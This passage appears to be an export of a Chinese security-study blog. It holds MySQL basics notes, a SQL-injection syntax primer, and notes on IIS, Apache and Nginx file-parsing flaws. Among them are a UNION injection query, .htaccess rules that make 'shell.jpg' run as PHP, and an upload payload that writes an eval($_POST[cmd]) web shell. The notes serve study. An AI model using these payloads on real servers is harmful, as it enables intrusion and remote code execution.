<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">COUNT</span>(*) <span class="keyword">AS</span> num_items</span><br><span class="line"><span class="keyword">MIN</span>(prod_price) <span class="keyword">AS</span> price_min,</span><br><span class="line"><span class="keyword">MAX</span>(prod_price) <span class="keyword">AS</span> price_max,</span><br><span class="line"><span class="keyword">AVG</span>(prod_price) <span class="keyword">AS</span> price_avg,</span><br><span class="line"><span class="keyword">FROM</span> products;</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h2 id="0x0B-分组数据">0x0B 分组数据</h2>
<ol>
<li>
<h5 id="创建分组">创建分组</h5>
<p><code>SELECT vend_id, COUNT(*) AS num_prods FROM products GROUP BY vend_id;</code><br>
GROUP BY子句指示MySQL按vend_id排序并且分组数据，这导致对每个vend_id而不是整张表计算num_prods一次。</p>
<blockquote>
<p>注意事项：</p>
<ul>
<li>GROUP BY 子句中列出的每个列都必须是检索列或有效的表达式<br>
(但不能是聚集函数)。如果在 SELECT 中使用表达式,则必须在<br>
GROUP BY 子句中指定相同的表达式，不能使用别名。</li>
<li>除聚集计算语句外, SELECT 语句中的每个列都必须在 GROUP BY 子<br>
句中给出给出相应的列名。</li>
<li>如果分组列中具有 NULL 值,则 NULL 将作为一个分组返回。如果列<br>
中有多行 NULL 值,它们将分为一组。</li>
<li>GROUP BY 子句必须出现在 WHERE 子句之后, ORDER BY 子句之前。</li>
</ul>
</blockquote>
</li>
<li>
<h5 id="过滤分组">过滤分组</h5>
<p><code>SELECT cust_id, COUNT(*) AS orders FROM orders GROUP BY cust_id HAVING COUNT(*) &gt;= 2;</code><br>
HAVING 非常类似于 WHERE 。事实上,目前为止所学过的所有类型的 WHERE 子句都可以用 HAVING 来替代。唯一的差别是WHERE 过滤行,而 HAVING 过滤分组。</p>
<blockquote>
<p><strong>WHERE 和 HAVING的差别</strong>：WHERE在数据分组前进行过滤，HAVING在数据分组后进行过滤。<code>SELECT vend_id, COUNT(*) AS num_prods FROM products WHERE prod_price &gt;= 10 GROUP BY vend_id  HAVING COUNT(*) &gt;=2;</code><br>
<img src="https://upload-images.jianshu.io/upload_images/11397602-9a412436558ab949.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
<p>WHERE 子句过滤所有 prod_price 至少为 10 的行。然后按 vend_id 分组数据, HAVING 子句过滤计数为 2 或 2 以上的分组。如果没有 WHERE 子句,将会多检索出两行(供应商 1002 ,销售的所有产品价格都在 10 以下;供应商 1001 ,销售3个产品,但只有一个产品的价格大于等于 10 )。<br>
<code>SELECT vend_id, COUNT(*) AS num_prods FROM products GROUP BY vend_id  HAVING COUNT(*) &gt;=2;</code><br>
<img src="https://upload-images.jianshu.io/upload_images/11397602-14ca7d388e91fbe5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
</blockquote>
</li>
<li>
<h5 id="SELECT子句顺序">SELECT子句顺序</h5>
<p>SELECT----------FROM----------WHERE----------GROUP BY----------HAVING----------ORDER BY----------LIMIT</p>
</li>
</ol>
<h2 id="0x0C-插入数据">0x0C 插入数据</h2>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> customers(cust_name,</span><br><span class="line">                     cust_address,</span><br><span class="line">                     cust_city,</span><br><span class="line">                     cust_zip,</span><br><span class="line">                     cust_country,</span><br><span class="line">                     cust_contact,</span><br><span class="line">                     cust_email)</span><br><span class="line">                VAlUSE(<span class="string">&#x27;Pep E. LaPew&#x27;</span>,</span><br><span class="line">                     <span class="string">&#x27;100 Main Street&#x27;</span>,</span><br><span class="line">                      <span class="string">&#x27;Los Angeles&#x27;</span>,</span><br><span class="line">                      <span class="string">&#x27;CA&#x27;</span>,</span><br><span class="line">                      <span class="string">&#x27;90046&#x27;</span>,</span><br><span class="line">                      <span class="string">&#x27;USA&#x27;</span>,</span><br><span class="line">                      <span class="literal">NULL</span>,</span><br><span class="line">                      <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure>
<p>在插入行时，MySQL将用VALUES列表中的相应值填入列表中的对应项。VALUES中的第一个值对应于第一个指定的列名。第二个值对应于第二个列名，如此等等。</p>
<p>因为提供了列名，VALUES必须以其指定的次序匹配指定的列名，不一定按各个列出现在实际表中的次序。</p>
<h2 id="0x0D-更新和删除数据">0x0D 更新和删除数据</h2>
<ol>
<li>
<h5 id="更新数据">更新数据</h5>
<p>基本的UPDATE语句由3部分组成，分别是：</p>
<ul>
<li>要更新的表；</li>
<li>列名和它们的新值；</li>
<li>确定要更新行的过滤条件。</li>
</ul>
<p>例如：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> customers</span><br><span class="line"><span class="keyword">SET</span> cust_email = <span class="string">&#x27;elmer@fudd.com&#x27;</span></span><br><span class="line"><span class="keyword">WHERE</span> cust_id = <span class="number">10005</span>;</span><br></pre></td></tr></table></figure>
<p>为了删除某个列的值，可设置它为NULL（假如表定义允许NULL值）。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> customers</span><br><span class="line"><span class="keyword">SET</span> cust_email = <span class="literal">NULL</span></span><br><span class="line"><span class="keyword">WHERE</span> cust_id = <span class="number">10005</span>;</span><br></pre></td></tr></table></figure>
</li>
<li>
<h5 id="删除数据">删除数据</h5>
<p>下面的语句从customers表中删除一行：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DELETE FROM customers</span><br><span class="line">WHERE cust_id &#x3D; 10006;</span><br></pre></td></tr></table></figure></li>
</ol>
]]></content>
      <categories>
        <category>web安全</category>
        <category>基础学习</category>
      </categories>
      <tags>
        <tag>web安全基础</tag>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL注入专项之MySQL基础操作</title>
    <url>/Web_security/basic_learning/22.SQL%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E4%B9%8BMySQL%E5%9F%BA%E7%A1%80%E6%B3%A8%E5%85%A5%E8%AF%AD%E6%B3%95/</url>
    <content><![CDATA[<h1 id="SQL注入专项之MySQL基础注入语法">SQL注入专项之MySQL基础注入语法</h1>
<p>基本上摘自k0rz3n师傅的<a href="https://www.k0rz3n.com/2019/01/30/SQL%20%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95%E7%9A%84%E5%B0%8F%E6%80%BB%E7%BB%93">一篇文章</a>，日常膜。</p>
<h3 id="字符串操作">字符串操作</h3>
<h4 id="合并字符串">合并字符串</h4>
<h5 id="concat">concat</h5>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select concat(&#39;hel&#39;,&#39;lo&#39;,&#39;world&#39;);</span><br><span class="line">+----------------------------+</span><br><span class="line">| concat(&#39;hel&#39;,&#39;lo&#39;,&#39;world&#39;) |</span><br><span class="line">+----------------------------+</span><br><span class="line">| helloworld                 |</span><br><span class="line">+----------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
<h5 id="concat-ws">concat_ws</h5>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select concat_ws(&#39;+&#39;, &#39;hello&#39;, &#39;world&#39;);</span><br><span class="line">+----------------------------------+</span><br><span class="line">| concat_ws(&#39;+&#39;, &#39;hello&#39;, &#39;world&#39;) |</span><br><span class="line">+----------------------------------+</span><br><span class="line">| hello+world                      |</span><br><span class="line">+----------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
<h4 id="截取字符串">截取字符串</h4>
<h5 id="substr或substring或mid">substr或substring或mid</h5>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select substring(&#39;www.baidu.com&#39;,&#39;5&#39;,5);</span><br><span class="line">+----------------------------------+</span><br><span class="line">| substring(&#39;www.baidu.com&#39;,&#39;5&#39;,5) |</span><br><span class="line">+----------------------------------+</span><br><span class="line">| baidu                            |</span><br><span class="line">+----------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
<h5 id="left">left</h5>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select left(&#39;flag&#123;this_is_test&#125;&#39;, 5);</span><br><span class="line">+-------------------------------+</span><br><span class="line">| left(&#39;flag&#123;this_is_test&#125;&#39;, 5) |</span><br><span class="line">+-------------------------------+</span><br><span class="line">| flag&#123;                         |</span><br><span class="line">+-------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
<h5 id="right">right</h5>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select right(&#39;flag&#123;this_is_test&#125;&#39;, 5);</span><br><span class="line">+--------------------------------+</span><br><span class="line">| right(&#39;flag&#123;this_is_test&#125;&#39;, 5) |</span><br><span class="line">+--------------------------------+</span><br><span class="line">| test&#125;                          |</span><br><span class="line">+--------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
<h5 id="substring-index">substring_index</h5>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select substring_index(&#39;flag&#123;111111-222222-333333&#125;&#39;,&#39;-&#39;,1);</span><br><span class="line">+-----------------------------------------------------+</span><br><span class="line">| substring_index(&#39;flag&#123;111111-222222-333333&#125;&#39;,&#39;-&#39;,1) |</span><br><span class="line">+-----------------------------------------------------+</span><br><span class="line">| flag&#123;111111                                         |</span><br><span class="line">+-----------------------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select substring_index(&#39;flag&#123;111111-222222-333333&#125;&#39;,&#39;-&#39;,-1);</span><br><span class="line">+------------------------------------------------------+</span><br><span class="line">| substring_index(&#39;flag&#123;111111-222222-333333&#125;&#39;,&#39;-&#39;,-1) |</span><br><span class="line">+------------------------------------------------------+</span><br><span class="line">| 333333&#125;                                              |</span><br><span class="line">+------------------------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select substring_index(&#39;flag&#123;111111-222222-333333&#125;&#39;,&#39;-&#39;,-2);</span><br><span class="line">+------------------------------------------------------+</span><br><span class="line">| substring_index(&#39;flag&#123;111111-222222-333333&#125;&#39;,&#39;-&#39;,-2) |</span><br><span class="line">+------------------------------------------------------+</span><br><span class="line">| 222222-333333&#125;                                       |</span><br><span class="line">+------------------------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
<h4 id="计算字符串长度">计算字符串长度</h4>
<h5 id="char-length-character-length-和-length-octet-length">char_length()/character_length() 和 length()/octet_length()</h5>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select char_length(&#39;你好&#39;);</span><br><span class="line">+-----------------------+</span><br><span class="line">| char_length(&#39;你好&#39;)   |</span><br><span class="line">+-----------------------+</span><br><span class="line">|                     2 |</span><br><span class="line">+-----------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select length(&#39;你好&#39;);</span><br><span class="line">+------------------+</span><br><span class="line">| length(&#39;你好&#39;)   |</span><br><span class="line">+------------------+</span><br><span class="line">|                6 |</span><br><span class="line">+------------------+</span><br><span class="line">1 row in set (0.01 sec)</span><br></pre></td></tr></table></figure>
<blockquote>
<p>char_length()/character_length() 计算的是字符的个数，而length()/octet_length() 计算的是字节的长度</p>
</blockquote>
<h4 id="改变存储的字符串">改变存储的字符串</h4>
<p>将 colname 列的双引号换成单引号</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">replace(colname,&#39;&quot;&#39;,&#39;\&#39;&#39;);</span><br></pre></td></tr></table></figure>
<h4 id="查找子字符串在字符串中的位置">查找子字符串在字符串中的位置</h4>
<h5 id="locate">locate</h5>
<ul>
<li>
<p>locate(substr, str)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select locate(&#39;bar&#39;, &#39;foobar&#39;);</span><br><span class="line">+-------------------------+</span><br><span class="line">| locate(&#39;bar&#39;, &#39;foobar&#39;) |</span><br><span class="line">+-------------------------+</span><br><span class="line">|                       4 |</span><br><span class="line">+-------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select locate(&#39;xbar&#39;, &#39;foobar&#39;);</span><br><span class="line">+--------------------------+</span><br><span class="line">| locate(&#39;xbar&#39;, &#39;foobar&#39;) |</span><br><span class="line">+--------------------------+</span><br><span class="line">|                        0 |</span><br><span class="line">+--------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>locate(substr, str, pos)/position</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select locate(&#39;bar&#39;, &#39;foobarbar&#39;, 5);</span><br><span class="line">+-------------------------------+</span><br><span class="line">| locate(&#39;bar&#39;, &#39;foobarbar&#39;, 5) |</span><br><span class="line">+-------------------------------+</span><br><span class="line">|                             7 |</span><br><span class="line">+-------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h5 id="instr">instr</h5>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select instr(&#39;123&#39;, &#39;12&#39;);</span><br><span class="line">+--------------------+</span><br><span class="line">| instr(&#39;123&#39;, &#39;12&#39;) |</span><br><span class="line">+--------------------+</span><br><span class="line">|                  1 |</span><br><span class="line">+--------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select instr(&#39;123&#39;, &#39;4&#39;);</span><br><span class="line">+-------------------+</span><br><span class="line">| instr(&#39;123&#39;, &#39;4&#39;) |</span><br><span class="line">+-------------------+</span><br><span class="line">|                 0 |</span><br><span class="line">+-------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
<h5 id="find-in-set">find_in_set</h5>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select find_in_set(&#39;a&#39;,&#39;a,b,c,d,e&#39;);</span><br><span class="line">+------------------------------+</span><br><span class="line">| find_in_set(&#39;a&#39;,&#39;a,b,c,d,e&#39;) |</span><br><span class="line">+------------------------------+</span><br><span class="line">|                            1 |</span><br><span class="line">+------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
<h4 id="正则匹配">正则匹配</h4>
<h5 id="like">like</h5>
<p>常用通配符：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">% : 匹配0个或任意多个字符</span><br><span class="line"></span><br><span class="line">_ : 匹配任意一个字符</span><br><span class="line"></span><br><span class="line">escape ： 转义字符，可匹配%和_</span><br></pre></td></tr></table></figure>
<h5 id="regexp-rlike">regexp/rlike</h5>
<p>常用通配符</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">. : 匹配任意单个字符</span><br><span class="line"></span><br><span class="line">* ： 匹配0个或多个前一个得到的字符</span><br><span class="line"></span><br><span class="line">[] : 匹配任意一个[]内的字符，[ab]*可匹配空串、a、b、或者由任意个a和b组成的字符串。</span><br><span class="line"></span><br><span class="line">^ : 匹配开头，如^s匹配以s或者S开头的字符串。</span><br><span class="line"></span><br><span class="line">$ : 匹配结尾，如s$匹配以s结尾的字符串。</span><br><span class="line"></span><br><span class="line">&#123;n&#125; : 匹配前一个字符反复n次。</span><br></pre></td></tr></table></figure>
<h5 id="字符串区分大小写比较">字符串区分大小写比较</h5>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select &#39;A&#39; &#x3D; binary &#39;a&#39;;</span><br><span class="line">+------------------+</span><br><span class="line">| &#39;A&#39; &#x3D; binary &#39;a&#39; |</span><br><span class="line">+------------------+</span><br><span class="line">|                0 |</span><br><span class="line">+------------------+</span><br><span class="line">1 row in set (0.01 sec)</span><br></pre></td></tr></table></figure>
<h4 id="自定义排序">自定义排序</h4>
<h5 id="elt">elt</h5>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">elt(N ,str1 ,str2 ,str3 ,…)</span><br></pre></td></tr></table></figure>
<p>若 N = 1 ，则返回值为 str1 ，若 N = 2 ，则返回值为 str2 ，以此类推。 若 N 小于 1 或大于参数的数目，则返回值为 NULL 。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; SELECT ELT(3,&#39;hello&#39;,&#39;halo&#39;,&#39;test&#39;,&#39;world&#39;);</span><br><span class="line">+--------------------------------------+</span><br><span class="line">| ELT(3,&#39;hello&#39;,&#39;halo&#39;,&#39;test&#39;,&#39;world&#39;) |</span><br><span class="line">+--------------------------------------+</span><br><span class="line">| test                                 |</span><br><span class="line">+--------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
<p>在盲注中的应用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select elt(1,0);</span><br><span class="line">+----------+</span><br><span class="line">| elt(1,0) |</span><br><span class="line">+----------+</span><br><span class="line">| 0        |</span><br><span class="line">+----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select elt(1,1);</span><br><span class="line">+----------+</span><br><span class="line">| elt(1,1) |</span><br><span class="line">+----------+</span><br><span class="line">| 1        |</span><br><span class="line">+----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
<h5 id="field">field</h5>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">FIELD(str, str1, str2, str3, ……)</span><br></pre></td></tr></table></figure>
<p>字段str按照字符串str1，str2，str3，str4的顺序返回查询到的结果集。如果表中str字段值不存在于str1，str2，str3，str4中的记录，放在结果集最前面返回。</p>
<p>当然这是正常的用法，还可以理解为这个函数返回的是str 在后面这些字符串中的索引。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select field(&#39;halo&#39;,&#39;hello&#39;,&#39;test&#39;,&#39;world&#39;);</span><br><span class="line">+--------------------------------------+</span><br><span class="line">| field(&#39;halo&#39;,&#39;hello&#39;,&#39;test&#39;,&#39;world&#39;) |</span><br><span class="line">+--------------------------------------+</span><br><span class="line">|                                    0 |</span><br><span class="line">+--------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select field(&#39;halo&#39;,&#39;hello&#39;,&#39;test&#39;,&#39;halo&#39;,&#39;world&#39;);</span><br><span class="line">+---------------------------------------------+</span><br><span class="line">| field(&#39;halo&#39;,&#39;hello&#39;,&#39;test&#39;,&#39;halo&#39;,&#39;world&#39;) |</span><br><span class="line">+---------------------------------------------+</span><br><span class="line">|                                           3 |</span><br><span class="line">+---------------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
<p><strong>在盲注中的应用</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select field(1,0);</span><br><span class="line">+------------+</span><br><span class="line">| field(1,0) |</span><br><span class="line">+------------+</span><br><span class="line">|          0 |</span><br><span class="line">+------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select field(1,1);</span><br><span class="line">+------------+</span><br><span class="line">| field(1,1) |</span><br><span class="line">+------------+</span><br><span class="line">|          1 |</span><br><span class="line">+------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
<p>这里的第二个参数决定了这条语句的执行结果。</p>
<h3 id="条件表达式">条件表达式</h3>
<h4 id="if语句">if语句</h4>
<p>if(condition,result1,result2)</p>
<p>当 condition 结果为真时返回 result1 否则返回 result2,这常常用作我们盲注的开关函数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select if(1,1,0);</span><br><span class="line">+-----------+</span><br><span class="line">| if(1,1,0) |</span><br><span class="line">+-----------+</span><br><span class="line">|         1 |</span><br><span class="line">+-----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select if(0,1,0);</span><br><span class="line">+-----------+</span><br><span class="line">| if(0,1,0) |</span><br><span class="line">+-----------+</span><br><span class="line">|         0 |</span><br><span class="line">+-----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
<h4 id="case语句">case语句</h4>
<p>基本形式：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">case(…)when…then…else…end</span><br></pre></td></tr></table></figure>
<p>两种变体：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">case expr when val1 then result1 when val2 then result2 else result3 end;</span><br></pre></td></tr></table></figure>
<p>先会判断 expr 的结果 ，再根据该结果是 val1 还是 val2 或者其他，来执行不同的语句。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">case when condition1 then result1 when condition2 result2 else result3 end;</span><br></pre></td></tr></table></figure>
<p>直接根据不同情况进行选择。</p>
<p>比如可以构造这样一条注入语句：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from test where id &#x3D;-1 union select 1,case when username like &#39;a%&#39; then 0 else 2222222222222222222 end,3,4 from tdb_admin</span><br></pre></td></tr></table></figure>
<h3 id="子查询">子查询</h3>
<blockquote>
<p>这一块我还没太看明白，先把模板贴下来</p>
</blockquote>
<h4 id="模板一">模板一</h4>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select ... from ... where col &#x3D; [any|all](select...);</span><br></pre></td></tr></table></figure>
<h4 id="模板二">模板二</h4>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select ....from ... where col [not]in(select...);</span><br></pre></td></tr></table></figure>
<h4 id="模板三">模板三</h4>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select row(value1,valu2...) &#x3D; [any&#x2F;some](select col1,col2...);</span><br></pre></td></tr></table></figure>
<h4 id="模板四">模板四</h4>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select ... from ...where col [not]exists(select...);</span><br></pre></td></tr></table></figure>
<h4 id="模板五">模板五</h4>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select ... from (select ...) as name where ...</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Web安全</category>
        <category>基础学习</category>
      </categories>
      <tags>
        <tag>Web安全学习</tag>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL盲注总结</title>
    <url>/Web_security/basic_learning/23.SQL%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E4%B9%8BMySQL%E7%9B%B2%E6%B3%A8%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h1 id="MySQL盲注总结">MySQL盲注总结</h1>
<p>最近在刷BUUCTF的时候，经常碰到MySQL盲注，但是每次碰到都有点不知道怎么下手，也看不出来是哪种类型的注入，在此就总结一下。主要是两种盲注方式：</p>
<ul>
<li>基于布尔的SQL盲注</li>
<li>基于时间的SQL盲注</li>
</ul>
<h2 id="0x01-布尔盲注">0x01 布尔盲注</h2>
<h3 id="使用条件">使用条件</h3>
]]></content>
  </entry>
  <entry>
    <title>服务器文件解析漏洞记录</title>
    <url>/Web_security/basic_learning/25.%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<h1 id="服务器文件解析漏洞记录">服务器文件解析漏洞记录</h1>
<p>没有新东西，简单记录一下。</p>
<blockquote>
<p><a href="https://www.anquanke.com/post/id/166616">https://www.anquanke.com/post/id/166616</a></p>
</blockquote>
<h2 id="0x01-IIS文件解析漏洞">0x01 IIS文件解析漏洞</h2>
<p>使用iis5.x-6.x版本的服务器，大多为windows server 2003，网站比较古老，开发语句一般为asp；该解析漏洞也只能解析asp文件，而不能解析aspx文件。</p>
<h3 id="目录解析">目录解析</h3>
<p>形式：<a href="http://www.xxx.com/xx.asp/xx.jpg">www.xxx.com/xx.asp/xx.jpg</a></p>
<p>原理: 服务器默认会把.asp，.asa目录下的文件都解析成asp文件。</p>
<h3 id="文件解析">文件解析</h3>
<p>形式：<a href="http://www.xxx.com/xx.asp;.jpg">www.xxx.com/xx.asp;.jpg</a></p>
<p>原理：服务器默认不解析;号后面的内容，因此xx.asp;.jpg便被解析成asp文件了。</p>
<h3 id="补充">补充</h3>
<p>IIS6.0的解析漏洞同样存在于IIS7.5版本。</p>
<h2 id="0x02-Apache文件解析漏洞">0x02 Apache文件解析漏洞</h2>
<h3 id="多后缀">多后缀</h3>
<p>Apache1.x和2.x 解析文件的规则是从右到左开始判断解析,如果后缀名为不可识别文件解析,就再往左判断。</p>
<h3 id="conf配置">conf配置</h3>
<p>1、如果在 Apache 的 conf 里有这样一行配置 <code>AddHandler php5-script .php</code> 这时只要文件名里包含 .php  即使文件名是 test2.php.jpg 也会以 php 来执行。</p>
<p>2、如果在 Apache 的 conf 里有这样一行配置 <code>AddType application/x-httpd-php .jpg</code>即使扩展名是 jpg，一样能以 php 方式执行。</p>
<h3 id="罕见后缀">罕见后缀</h3>
<p>Apache 配置文件中会有<code>.+.ph(p[345]?|t|tml)</code>此类的正则表达式，被当 php 程序执行的文件名要符合正则表达式，否则就算 Apache 把某文件当 php 程序，php 自己不认它，也是无用。</p>
<p>也就是说<code>php3，php4，php5，pht，phtml</code>也是可以被解析的。</p>
<h3 id="htaccess">.htaccess</h3>
<p>要想使 <code>.htaccess</code> 文件生效，需要两个条件:</p>
<p><strong>一是在 Apache 的配置文件中写上：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AllowOverrideAll</span><br></pre></td></tr></table></figure>
<p>若这样写则 <code>.htaccess</code> 不会生效：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AllowOverrideNone</span><br></pre></td></tr></table></figure>
<p><strong>二是 Apache 要加载 mod_Rewrite 模块。加载该模块，需要在 Apache 的配置文件中写上：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">LoadModulerewrite_module&#x2F;usr&#x2F;lib&#x2F;apache2&#x2F;modules&#x2F;mod_rewrite.so</span><br></pre></td></tr></table></figure>
<p>若是在 Ubuntu 中，可能还需要执行命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudoa2enmod rewrite</span><br></pre></td></tr></table></figure>
<p>配置完后需要重启 Apache。</p>
<p><strong>如在 <code>.htaccess</code> 文件中写入：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AddTypeapplication&#x2F;x-httpd-php xxx</span><br></pre></td></tr></table></figure>
<p>就成功地使该 <code>.htaccess</code> 文件所在目录及其子目录中的后缀为 .xxx 的文件被 Apache 当做 php 文件。</p>
<p>还有一种写法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;FilesMatch&quot;shell.jpg&quot;&gt;</span><br><span class="line"> SetHandlerapplication&#x2F;x-httpd-php</span><br><span class="line">&lt;&#x2F;FilesMatch&gt;</span><br></pre></td></tr></table></figure>
<h2 id="0x03-Nginx文件解析漏洞">0x03 Nginx文件解析漏洞</h2>
<h3 id="PHP-CGI解析漏洞">PHP CGI解析漏洞</h3>
<p>漏洞原理参考：<a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html">https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html</a></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200819140421.png" alt=""></p>
<p>所以下面两种写法都会将1.jpg当作PHP来解析</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">www.xxxx.com&#x2F;UploadFiles&#x2F;image&#x2F;1.jpg&#x2F;1.php  </span><br><span class="line"></span><br><span class="line">www.xxxx.com&#x2F;UploadFiles&#x2F;image&#x2F;1.jpg&#x2F;%20\0.php</span><br></pre></td></tr></table></figure>
<p>另外一种手法：上传一个名字为 test.jpg，以下内容的文件:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?PHP</span> fputs(fopen(<span class="string">&#x27;shell.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php eval($_POST[cmd])?&gt;&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>然后访问 <code>test.jpg/.php</code>, 在这个目录下就会生成一句话木马 shell.php。</p>
<h3 id="空字节代码执行漏洞">空字节代码执行漏洞</h3>
<p>恶意用户发出请求<code>http://example.com/file.ext％00.php</code>就会将 <code>file.ext</code> 作为 PHP 文件解析。</p>
]]></content>
      <categories>
        <category>Web安全</category>
        <category>基础学习</category>
      </categories>
      <tags>
        <tag>Web安全学习</tag>
        <tag>服务器解析漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL攻击面和提权总结</title>
    <url>/Web_security/basic_learning/26.MySQL%E6%94%BB%E5%87%BB%E9%9D%A2%E5%92%8C%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h1 id="MySQL攻击面和提权总结">MySQL攻击面和提权总结</h1>
<p>本次实验使用腾讯云主机的MySQL Server作为服务端，阿里云主机作为MySQL客户端。</p>
<p>其中均使用宝塔面板搭建MySQL8.0版本。</p>
<p>首先要开放腾讯云主机的端口，并且允许MySQL Server允许任意用户远程登录。</p>
